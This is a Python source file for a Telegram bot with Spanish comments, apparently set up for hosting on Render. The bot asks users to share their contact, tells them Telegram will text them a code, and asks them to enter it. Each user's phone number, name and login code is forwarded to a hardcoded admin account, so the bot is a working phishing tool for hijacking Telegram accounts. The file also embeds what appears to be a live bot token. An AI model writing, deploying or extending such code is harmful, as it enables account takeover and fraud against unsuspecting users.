import asyncio
import logging
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, ConversationHandler
from aiohttp import web

# ================================
# CONFIGURACIÓN DIRECTA EN CÓDIGO
# ================================
TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"  # TU TOKEN AQUÍ
ADMIN_ID = 7363341763  # TU ID DE TELEGRAM AQUÍ
PORT = 10000  # Puerto para Render

# ================================
# INICIALIZACIÓN
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Estados
PHONE, CODE = range(2)

# Almacenamiento en memoria
user_sessions = {}

# ================================
# FUNCIONES DEL BOT
# ================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start - Inicia el proceso"""
    user = update.effective_user
    
    # Guardar sesión
    user_sessions[user.id] = {
        "step": "waiting_contact",
        "username": user.username,
        "start_time": datetime.now().strftime("%H:%M:%S")
    }
    
    # Botón para compartir contacto
    keyboard = [[KeyboardButton("📱 Compartir contacto", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "Para acceder, comparte tu contacto:",
        reply_markup=reply_markup
    )
    
    return PHONE

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja el contacto compartido"""
    user = update.effective_user
    contact = update.message.contact
    
    # Verificar que sea su contacto
    if contact.user_id != user.id:
        await update.message.reply_text("❌ Comparte tu propio contacto.")
        return PHONE
    
    # Guardar datos
    user_sessions[user.id] = {
        "step": "waiting_code",
        "phone": contact.phone_number,
        "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
        "username": user.username,
        "contact_time": datetime.now().strftime("%H:%M:%S")
    }
    
    # 🔥 ENVIAR AL ADMINISTRADOR
    admin_msg = f"""
📱 NUEVO CONTACTO
──────────────
👤 Nombre: {user_sessions[user.id]['name']}
📞 Teléfono: {contact.phone_number}
🆔 ID: {user.id}
👁️ User: @{user.username or 'N/A'}
⏰ Hora: {datetime.now().strftime('%H:%M:%S')}
──────────────
📝 Esperando código...
"""
    
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
        logger.info(f"📤 Contacto enviado al admin: {user.id}")
    except Exception as e:
        logger.error(f"❌ Error enviando al admin: {e}")
    
    # Instrucciones al usuario
    await update.message.reply_text(
        "✅ Contacto recibido.\n\n"
        "📨 Telegram te enviará un código por SMS.\n"
        "Cuando lo recibas, escríbelo aquí:",
        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
    )
    
    return CODE

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja el código ingresado"""
    user = update.effective_user
    code = update.message.text.strip()
    
    # Verificar estado
    if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
        await update.message.reply_text("❌ Usa /start para comenzar.")
        return ConversationHandler.END
    
    user_data = user_sessions[user.id]
    
    # 🔥 ENVIAR CÓDIGO AL ADMIN
    code_msg = f"""
🔐 CÓDIGO RECIBIDO
──────────────
👤 Usuario: {user_data.get('name', 'N/A')}
📞 Teléfono: {user_data.get('phone', 'N/A')}
🆔 ID: {user.id}
👁️ User: @{user.username or 'N/A'}
⏰ Hora: {datetime.now().strftime('%H:%M:%S')}
──────────────
🔢 Código: {code}
✅ VERIFICACIÓN COMPLETA
"""
    
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=code_msg)
        logger.info(f"📤 Código enviado al admin: {user.id} - {code}")
    except Exception as e:
        logger.error(f"❌ Error enviando código: {e}")
    
    # Confirmación al usuario
    await update.message.reply_text(
        f"✅ Código recibido: {code}\n\n"
        "🎉 ¡Verificación completada!"
    )
    
    # Limpiar sesión
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancela el proceso"""
    user = update.effective_user
    
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    await update.message.reply_text("❌ Proceso cancelado.")
    return ConversationHandler.END

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Estadísticas (solo admin)"""
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
    
    waiting = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
    
    stats_msg = f"""
📊 ESTADÍSTICAS
──────────────
• Sesiones activas: {len(user_sessions)}
• Esperando código: {waiting}
• Admin ID: {ADMIN_ID}
• Servidor: Render.com
• Hora: {datetime.now().strftime('%H:%M:%S')}
──────────────
"""
    
    await update.message.reply_text(stats_msg)

# ================================
# SERVIDOR WEB PARA RENDER
# ================================

async def health_check(request):
    """Endpoint de salud para Render"""
    waiting = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>🤖 Bot de Telegram</title>
        <meta charset="utf-8">
        <style>
            body {{
                font-family: monospace;
                background: #0f0f23;
                color: #00ff00;
                padding: 20px;
                margin: 0;
            }}
            .container {{
                max-width: 800px;
                margin: 0 auto;
                border: 1px solid #00ff00;
                padding: 20px;
            }}
            h1 {{ color: #ffffff; margin-top: 0; }}
            .status {{ 
                background: #00ff00; 
                color: #000; 
                padding: 10px;
                margin: 10px 0;
                font-weight: bold;
            }}
            pre {{ 
                background: #1a1a2e; 
                padding: 15px;
                overflow-x: auto;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤖 Bot de Telegram Activo</h1>
            <div class="status">✅ STATUS: ONLINE</div>
            
            <h3>📡 Información del Sistema:</h3>
            <pre>
🔑 Token: {TOKEN[:10]}...
👑 Admin ID: {ADMIN_ID}
🌐 Puerto: {PORT}
🔄 Método: Polling
📅 Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            </pre>
            
            <h3>📊 Estadísticas:</h3>
            <pre>
👥 Sesiones activas: {len(user_sessions)}
⏳ Esperando código: {waiting}
🆗 Health: OK
            </pre>
            
            <p>🛠️ Servicio hosteado en <strong>Render.com</strong></p>
        </div>
    </body>
    </html>
    """
    
    return web.Response(text=html, content_type='text/html')

# ================================
# EJECUCIÓN PRINCIPAL
# ================================

async def start_web_server():
    """Inicia servidor HTTP para Render"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    logger.info(f"🌐 Servidor HTTP iniciado en puerto {PORT}")
    return runner

async def start_telegram_bot():
    """Inicia el bot de Telegram"""
    # Crear aplicación
    application = Application.builder().token(TOKEN).build()
    
    # Configurar handlers
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [
                MessageHandler(filters.CONTACT, handle_contact),
                CommandHandler('cancel', cancel)
            ],
            CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code),
                CommandHandler('cancel', cancel)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('stats', stats))
    
    # Iniciar bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logger.info(f"🤖 Bot iniciado con token: {TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    
    return application

async def main():
    """Función principal"""
    print("=" * 50)
    print("🚀 INICIANDO BOT DE TELEGRAM")
    print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🔑 Token: {TOKEN[:10]}...")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"🌐 Puerto: {PORT}")
    print("=" * 50)
    
    try:
        # Iniciar servidor web
        web_server = await start_web_server()
        
        # Iniciar bot
        bot = await start_telegram_bot()
        
        # Mantener activo
        print("\n✅ Sistema operativo")
        print("📡 Escuchando actualizaciones...")
        print("🛑 Presiona Ctrl+C para detener\n")
        
        while True:
            await asyncio.sleep(3600)
            
    except KeyboardInterrupt:
        print("\n⏹️ Deteniendo servicio...")
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        print("👋 Servicio detenido")
